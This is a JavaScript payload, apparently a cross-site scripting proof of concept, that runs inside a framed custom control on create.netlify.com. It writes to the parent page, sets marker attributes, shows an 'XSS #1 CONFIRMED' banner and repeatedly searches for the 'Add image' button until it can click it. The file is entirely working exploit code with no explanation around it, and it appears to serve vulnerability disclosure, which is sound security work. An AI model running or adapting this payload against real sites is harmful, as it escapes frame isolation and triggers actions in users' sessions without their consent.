(() => {
  const doc = parent.document;
  const root = doc.documentElement;
  root.setAttribute('data-create-custom-xss', 'confirmed');

  if (!doc.getElementById('create-custom-xss-proof')) {
    const marker = doc.createElement('div');
    marker.id = 'create-custom-xss-proof';
    marker.textContent = 'XSS #1 CONFIRMED: custom control executed in the parent create.netlify.com page';
    Object.assign(marker.style, {
      position: 'fixed', top: '12px', left: '50%', transform: 'translateX(-50%)',
      zIndex: '2147483647', padding: '12px 18px', border: '3px solid #0a0',
      borderRadius: '8px', background: '#fff', color: '#070', font: '700 16px system-ui'
    });
    doc.body.appendChild(marker);
  }

  let tries = 0;
  const timer = parent.setInterval(() => {
    const addImage = [...doc.querySelectorAll('button')].find((button) =>
      /^add image$/i.test((button.innerText || button.textContent || '').trim())
    );
    if (addImage) {
      parent.clearInterval(timer);
      root.setAttribute('data-create-asset-autotrigger', 'clicked');
      addImage.click();
    } else if (++tries >= 80) {
      parent.clearInterval(timer);
      root.setAttribute('data-create-asset-autotrigger', 'button-not-found');
    }
  }, 250);
})();
